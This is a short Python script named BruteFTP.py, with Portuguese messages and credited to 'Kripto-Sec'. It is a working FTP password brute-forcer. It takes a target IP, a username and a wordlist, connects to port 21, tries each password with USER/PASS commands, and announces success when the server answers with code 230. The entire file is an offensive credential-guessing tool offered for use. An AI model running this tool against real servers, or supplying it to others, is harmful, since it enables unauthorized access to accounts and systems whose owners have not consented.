import socket
import re
import sys



if len(sys.argv) < 2:
    print ("Criado por Jean(Kripto-Sec)")
    print ("github:https://github.com/Kripto-Sec")
    print ('\033[1m'+"Para usar digite python BruteFTP.py 127.0.0.1 usuario wordlist.txt"+'\033[1m')
    sys.exit(0)

usuario = sys.argv[2]

file = open(sys.argv[3])
linhas = file.readlines()
for linha in linhas:
    print ( '\033[33m'+"Teste em {} : {}".format(usuario, linha)+'\033[33m')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],21))
    s.recv(1024)
    s.send("USER "+usuario+"\r\n")
    s.recv(1024)
    s.send("PASS "+linha+"\r\n")
    resultado = s.recv(1024)
    s.send("QUIT\r\n")

    

    if re.search("230", resultado): 
        print ('\033[0;32m'+"[+]===>>> SENHA ENCONTRADA <<<==="+'\033[0;32m')
        print ("[+] ===>>> {}".format(linha))
        break
    else:
        print ('\033[1;31m'+"[-]SENHA NAO ENCONTRADA :( [-]\n"+'\033[1;31m')